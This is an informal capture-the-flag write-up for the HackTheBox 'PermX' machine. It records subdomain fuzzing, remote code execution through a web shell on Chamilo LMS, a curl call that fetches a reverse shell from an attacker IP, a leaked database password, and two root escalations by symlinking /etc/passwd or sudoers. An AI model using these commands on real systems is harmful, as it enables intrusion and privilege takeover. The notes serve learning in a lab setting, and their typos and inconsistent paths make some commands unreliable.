# PermX

- namp resuls shows that there's only two open ports 22 ssh , 80 apache (v 2.4.52)
- fuzzing for directories didn't return anything usefull , either the js files
- the permx.htb -> is a static website and there is no interesting files under it so let's fuzz for subdomain
- fuzzing for subdomains reveals that `www , lms` are a valid subdomains
  - i used this command `ffuf -w  ~/Desktop/secLists/Discovery/DNS/subdomains-top1million-110000.txt   -H "Host: FUZZ.permx.htb" -u <http://permx.htb> -mc 200`
- the `www` subdoamin is the same as the static website
- `lms.permx.htb` seems it will be out entry point
  - chamilo  , Administrator : Davis Miller
- chamilo is already vulnerable to RCE
`end point that allows me to rce`
`GET /main/inc/lib/javascript/bigupload/files/rev_dedoxd2.php?cmd=curl+<http://10.10.16.55:8000/rev_dedoxd2.php>`

- i have uploaded a reverse shell for better interaction with the machine
- the reverse shell we got is suck
  - we could use this command to get better one `python3 -c 'import pty;pty.spawn("/bin/bash")'`

- after getting the reverse shell , we might use this command top  find the configuration file for the webapp (it holds good infos)
  - find . -type f -name "configuration.php" # or we could search for "configuration.*"
    > find . -type f -name "configuration.php"
    > ./chamilo/app/config/configuration.php
    > ./chamilo/plugin/sepe/src/configuration.php

---------
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php

cat configuration.php -> interesting results

$_configuration['db_password'] = '03F6lY3uXAP2bkW8';

---------
Take aways from this machine :

- `sudo -l` this command shows the commands can run as a sudo

## Take Aways

- don't forget to enumerate the subdomains as well for the directories
- after taking a shell on a web server don't forget to look at the configuration files
- in the privilage escalation part there was actually two ways to to do it
  - The first way is :
    - create a sym link the /etc/passwd in the user home directory
      > ln -s /etc/passwd /home/mtz/test
    - give ur self a read write permision to it
      > sudo /opt/acl.sh mtz rw /home/mtz/test
    - give permissions to root3 by using echo on the symlink file
      > echo "root3::0:0:root3:/root:/bin/bash" >> ./test
    - change user to root3
      > su root3
    - bam!! , root shell
  - The Second way :
    - create a sym link to the sudoers file
      > ln -s /etc/sudoers /home/mtz/sudoers
    - give yourself a read/write permsion to it
      > sudo /opt/acl/sh mtz rw /home/mtz/sudoers
    - see the sudoers and notice that `mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl/sh`
    - relrace the specified sscript by `ALL` phrase , u could use the sed command or any file editor using the CLI Like nano or vim
      > sed -i 's/\/opt\/acl.sh/ALL/' sudoers #mtz ALL=(ALL:ALL) NOPASSWD: ALL # make it like this
